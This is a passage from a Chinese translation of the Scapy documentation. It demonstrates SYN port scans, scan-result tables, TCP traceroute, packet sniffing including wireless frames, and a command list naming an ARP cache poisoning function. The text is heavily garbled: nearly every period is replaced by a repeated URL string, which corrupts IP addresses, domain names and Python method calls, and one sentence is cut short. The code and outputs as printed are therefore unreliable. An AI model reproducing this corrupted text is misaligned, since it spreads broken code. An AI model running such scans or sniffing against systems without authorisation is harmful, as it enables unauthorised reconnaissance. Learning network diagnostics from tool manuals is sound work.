nscount=0 arcount=0 qd=&lt;DNSQR qname='wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/slashdothttps://wizardforcel.gitbooks.io/scapy-docs/content/orghttps://wizardforcel.gitbooks.io/scapy-docs/content/' qtype=A qclass=IN |&gt;
an=&lt;DNSRR rrname='wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/slashdothttps://wizardforcel.gitbooks.io/scapy-docs/content/orghttps://wizardforcel.gitbooks.io/scapy-docs/content/' type=A rclass=IN ttl=3560L rdata='66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151' |&gt;
ns=0 ar=0 |&lt;Padding load='\xc6\x94\xc7\xeb' |&gt;&gt;&gt;&gt;</code></pre> 
<p>发送和接收函数族是scapy中的核心部分。它们返回一对两个列表。第一个就是发送的数据包及其应答组成的列表，第二个是无应答数据包组成的列表。为了更好地呈现它们，它们被封装成一个对象，并且提供了一些便于操作的方法：</p> 
<pre><code>&gt;&gt;&gt; sr(IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1")/TCP(dport=[21,22,23]))
Received 6 packets, got 3 answers, remaining 0 packets
(&lt;Results: UDP:0 TCP:3 ICMP:0 Other:0&gt;, &lt;Unanswered: UDP:0 TCP:0 ICMP:0 Other:0&gt;)
&gt;&gt;&gt; ans,unans=_
&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summary()
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1:21 S ==&gt; Ether / IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1:21 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 RA / Padding
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1:22 S ==&gt; Ether / IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1:22 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 RA / Padding
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1:23 S ==&gt; Ether / IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1:23 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 RA / Padding</code></pre> 
<p>如果对于应答数据包有速度限制，你可以通过<code>inter</code>参数来设置两个数据包之间等待的时间间隔。如果有些数据包丢失了，或者设置时间间隔不足以满足要求，你可以重新发送所有无应答数据包。你可以简单地对无应答数据包列表再调用一遍函数，或者去设置<code>retry</code>参数。如果retry设置为3，scapy会对无应答的数据包重复发送三次。如果retry设为-3，scapy则会一直发送无应答的数据包，直到。<code>timeout</code>参数设置在最后一个数据包发出去之后的等待时间：</p> 
<p>在Scapy提示符中执行一下命令，可以对经典的SYN Scan初始化：</p> 
<pre><code>&gt;&gt;&gt; sr1(IP(dst="72https://wizardforcel.gitbooks.io/scapy-docs/content/14https://wizardforcel.gitbooks.io/scapy-docs/content/207https://wizardforcel.gitbooks.io/scapy-docs/content/99")/TCP(dport=80,flags="S"))
以上向Google的80端口发送了一个SYN数据包，会在接收到一个应答后退出：


Begin emission:
https://wizardforcel.gitbooks.io/scapy-docs/content/Finished to send 1 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
*
Received 2 packets, got 1 answers, remaining 0 packets
&lt;IP version=4L ihl=5L tos=0x20 len=44 id=33529 flags= frag=0L ttl=244
proto=TCP chksum=0x6a34 src=72https://wizardforcel.gitbooks.io/scapy-docs/content/14https://wizardforcel.gitbooks.io/scapy-docs/content/207https://wizardforcel.gitbooks.io/scapy-docs/content/99 dst=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100 options=// |
&lt;TCP sport=www dport=ftp-data seq=2487238601L ack=1 dataofs=6L reserved=0L
flags=SA window=8190 chksum=0xcdc7 urgptr=0 options=[('MSS', 536)] |
&lt;Padding load='V\xf7' |&gt;&gt;&gt;</code></pre> 
<p>从以上的输出中可以看出，Google返回了一个SA（SYN-ACK）标志位，表示80端口是open的。</p> 
<p>使用其他标志位扫描一下系统的440到443端口：</p> 
<pre><code>&gt;&gt;&gt; sr(IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1")/TCP(sport=666,dport=(440,443),flags="S"))</code></pre> 
<p>或者</p> 
<pre><code>&gt;&gt;&gt; sr(IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1")/TCP(sport=RandShort(),dport=[440,441,442,443],flags="S"))</code></pre> 
<p>可以对收集的数据包进行摘要（summary），来快速地浏览响应：</p> 
<pre><code>&gt;&gt;&gt; ans,unans = _
&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summary()
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp-data &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:440 S ======&gt; IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:440 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp-data RA / Padding
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp-data &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:441 S ======&gt; IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:441 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp-data RA / Padding
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp-data &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:442 S ======&gt; IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:442 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp-data RA / Padding
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp-data &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:https S ======&gt; IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:https &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp-data SA / Padding</code></pre> 
<p>以上显示了我们在扫描过程中的请求应答对。我们也可以用一个循环只显示我们感兴趣的信息：</p> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summary( lambda(s,r): rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/sport% \t %TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/flags%") )
440 RA
441 RA
442 RA
https SA</code></pre> 
<p>可以使用<code>make_table()</code>函数建立一个表格，更好地显示多个目标信息：</p> 
<pre><code>&gt;&gt;&gt; ans,unans = sr(IP(dst=["192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1","yahoohttps://wizardforcel.gitbooks.io/scapy-docs/content/com","slashdothttps://wizardforcel.gitbooks.io/scapy-docs/content/org"])/TCP(dport=[22,80,443],flags="S"))
Begin emission:
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/**https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Finished to send 9 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
**https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
Received 362 packets, got 8 answers, remaining 1 packets
&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/make_table(
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ lambda(s,r): (shttps://wizardforcel.gitbooks.io/scapy-docs/content/dst, shttps://wizardforcel.gitbooks.io/scapy-docs/content/dport,
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("{TCP:%TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/flags%}{ICMP:%IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/src% - %ICMPhttps://wizardforcel.gitbooks.io/scapy-docs/content/type%}")))
66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/150 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/112https://wizardforcel.gitbooks.io/scapy-docs/content/135
22 66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/150 - dest-unreach RA -
80 SA RA SA
443 SA SA SA</code></pre> 
<p>在以上的例子中，如果接收到作为响应的ICMP数据包而不是预期的TCP数据包，就会打印出ICMP差错类型（error type）。</p> 
<p>对于更大型的扫描，我们可能对某个响应感兴趣，下面的例子就只显示设置了"SA"标志位的数据包：</p> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/nsummary(lfilter = lambda (s,r): rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/flags%") == "SA")
0003 IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp_data &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:https S ======&gt; IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1:https &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100:ftp_data SA</code></pre> 
<p>如果我们想对响应进行专业分析，我们可以使用使用以下的命令显示哪些端口是open的：</p> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summary(lfilter = lambda (s,r): rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/flags%") == "SA",prn=lambda(s,r):rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/sport% is open"))
https is open</code></pre> 
<p>对于更大型的扫描，我们可以建立一个端口开放表：</p> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/filter(lambda (s,r):TCP in r and r[TCP]https://wizardforcel.gitbooks.io/scapy-docs/content/flags&amp;2)https://wizardforcel.gitbooks.io/scapy-docs/content/make_table(lambda (s,r):
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ (shttps://wizardforcel.gitbooks.io/scapy-docs/content/dst, shttps://wizardforcel.gitbooks.io/scapy-docs/content/dport, "X"))
66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/150 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/112https://wizardforcel.gitbooks.io/scapy-docs/content/135
80 X - X
443 X X X</code></pre> 
<p>如果以上的方法还不够，Scapy还包含一个<code>report_ports()</code>函数，该函数不仅可以自动化SYN scan，而且还会对收集的结果以LaTeX形式输出：</p> 
<pre><code>&gt;&gt;&gt; report_ports("192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1",(440,443))
Begin emission:
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/**Finished to send 4 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
*
Received 8 packets, got 4 answers, remaining 0 packets
'\\begin{tabular}{|r|l|l|}\n\\hline\nhttps &amp; open &amp; SA \\\\\n\\hline\n440
&amp; closed &amp; TCP RA \\\\\n441 &amp; closed &amp; TCP RA \\\\\n442 &amp; closed &amp;
TCP RA \\\\\n\\hline\n\\hline\n\\end{tabular}\n'</code></pre> 
<p>TCP路由追踪：</p> 
<pre><code>&gt;&gt;&gt; ans,unans=sr(IP(dst=target, ttl=(4,25),id=RandShort())/TCP(flags=0x2))
*****https://wizardforcel.gitbooks.io/scapy-docs/content/******https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/***https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/**Finished to send 22 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
***https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
Received 33 packets, got 21 answers, remaining 1 packets
&gt;&gt;&gt; for snd,rcv in ans:
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ print sndhttps://wizardforcel.gitbooks.io/scapy-docs/content/ttl, rcvhttps://wizardforcel.gitbooks.io/scapy-docs/content/src, isinstance(rcvhttps://wizardforcel.gitbooks.io/scapy-docs/content/payload, TCP)
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
5 194https://wizardforcel.gitbooks.io/scapy-docs/content/51https://wizardforcel.gitbooks.io/scapy-docs/content/159https://wizardforcel.gitbooks.io/scapy-docs/content/65 0
6 194https://wizardforcel.gitbooks.io/scapy-docs/content/51https://wizardforcel.gitbooks.io/scapy-docs/content/159https://wizardforcel.gitbooks.io/scapy-docs/content/49 0
4 194https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/107https://wizardforcel.gitbooks.io/scapy-docs/content/181 0
7 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/126https://wizardforcel.gitbooks.io/scapy-docs/content/34 0
8 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/126https://wizardforcel.gitbooks.io/scapy-docs/content/154 0
9 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/89 0
10 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/110 0
11 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/173 0
13 208https://wizardforcel.gitbooks.io/scapy-docs/content/172https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/165 0
12 193https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/173 0
14 208https://wizardforcel.gitbooks.io/scapy-docs/content/172https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/165 0
15 206https://wizardforcel.gitbooks.io/scapy-docs/content/24https://wizardforcel.gitbooks.io/scapy-docs/content/226https://wizardforcel.gitbooks.io/scapy-docs/content/99 0
16 206https://wizardforcel.gitbooks.io/scapy-docs/content/24https://wizardforcel.gitbooks.io/scapy-docs/content/238https://wizardforcel.gitbooks.io/scapy-docs/content/34 0
17 173https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/66https://wizardforcel.gitbooks.io/scapy-docs/content/90 0
18 173https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/88https://wizardforcel.gitbooks.io/scapy-docs/content/218 0
19 173https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/39https://wizardforcel.gitbooks.io/scapy-docs/content/101 1
20 173https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/39https://wizardforcel.gitbooks.io/scapy-docs/content/101 1
21 173https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/39https://wizardforcel.gitbooks.io/scapy-docs/content/101 1
22 173https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/39https://wizardforcel.gitbooks.io/scapy-docs/content/101 1
23 173https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/39https://wizardforcel.gitbooks.io/scapy-docs/content/101 1
24 173https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/39https://wizardforcel.gitbooks.io/scapy-docs/content/101 1</code></pre> 
<p>注意：TCP路由跟踪和其他高级函数早已被构造好了：</p> 
<pre><code>&gt;&gt;&gt; lsc()
sr : Send and receive packets at layer 3
sr1 : Send packets at layer 3 and return only the first answer
srp : Send and receive packets at layer 2
srp1 : Send and receive packets at layer 2 and return only the first answer
srloop : Send a packet at layer 3 in loop and print the answer each time
srploop : Send a packet at layer 2 in loop and print the answer each time
sniff : Sniff packets
p0f : Passive OS fingerprinting: which OS emitted this TCP SYN ?
arpcachepoison : Poison target's cache with (your MAC,victim's IP) couple
send : Send packets at layer 3
sendp : Send packets at layer 2
traceroute : Instant TCP traceroute
arping : Send ARP who-has requests to determine which hosts are up
ls : List available layers, or infos on a given layer
lsc : List user commands
queso : Queso OS fingerprinting
nmap_fp : nmap fingerprinting
report_ports : portscan a target and output a LaTeX table
dyndns_add : Send a DNS add message to a nameserver for "name" to have a new "rdata"
dyndns_del : Send a DNS delete message to a nameserver for "name"
[https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/]</code></pre> 
<p>发送和接收数据包的过程是相当复杂的。</p> 
<p>我们可以简单地捕获数据包，或者是克隆tcpdump或tethereal的功能。如果没有指定interface，则会 在所有的interface上进行嗅探：</p> 
<pre><code>&gt;&gt;&gt; sniff(filter="icmp and host 66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151", count=2)
&lt;Sniffed: UDP:0 TCP:0 ICMP:2 Other:0&gt;
&gt;&gt;&gt; a=_
&gt;&gt;&gt; ahttps://wizardforcel.gitbooks.io/scapy-docs/content/nsummary()
0000 Ether / IP / ICMP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21 echo-request 0 / Raw
0001 Ether / IP / ICMP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21 echo-request 0 / Raw
&gt;&gt;&gt; a[1]
&lt;Ether dst=00:ae:f3:52:aa:d1 src=00:02:15:37:a2:44 type=0x800 |&lt;IP version=4L
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=ICMP chksum=0x3831
src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21 dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151 options='' |&lt;ICMP type=echo-request code=0
chksum=0x6571 id=0x8745 seq=0x0 |&lt;Raw load='B\xf7g\xda\x00\x07um\x08\t\n\x0b
\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d
\x1e\x1f !\x22#$%&amp;\'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/01234567' |&gt;&gt;&gt;&gt;
&gt;&gt;&gt; sniff(iface="wifi0", prn=lambda x: xhttps://wizardforcel.gitbooks.io/scapy-docs/content/summary())
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 8 ff:ff:ff:ff:ff:ff / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info 133
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 4 ff:ff:ff:ff:ff:ff / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Probe Request / Info SSID / Info Rates
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 5 00:0a:41:ee:a5:50 / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Probe Response / Info SSID / Info Rates / Info DSset / Info 133
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 4 ff:ff:ff:ff:ff:ff / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Probe Request / Info SSID / Info Rates
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 4 ff:ff:ff:ff:ff:ff / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Probe Request / Info SSID / Info Rates
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 8 ff:ff:ff:ff:ff:ff / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info 133
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 11 00:07:50:d6:44:3f / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Authentication
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 11 00:0a:41:ee:a5:50 / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Authentication
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 0 00:07:50:d6:44:3f / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Association Request / Info SSID / Info Rates / Info 133 / Info 149
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 1 00:0a:41:ee:a5:50 / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Association Response / Info Rates / Info 133 / Info 149
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 8 ff:ff:ff:ff:ff:ff / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info 133
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Management 8 ff:ff:ff:ff:ff:ff / 802https://wizardforcel.gitbooks.io/scapy-docs/content/11 Beacon / Info SSID / Info Rates / Info DSset / Info TIM / Info 133
